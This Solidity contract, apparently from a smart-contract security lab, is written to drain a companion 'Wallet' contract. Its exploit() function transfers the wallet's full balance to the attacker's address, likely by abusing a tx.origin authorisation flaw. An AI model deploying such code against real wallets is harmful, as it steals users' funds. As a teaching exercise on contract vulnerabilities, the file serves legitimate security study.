// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./Wallet.sol";

contract WalletAttack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function exploit() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}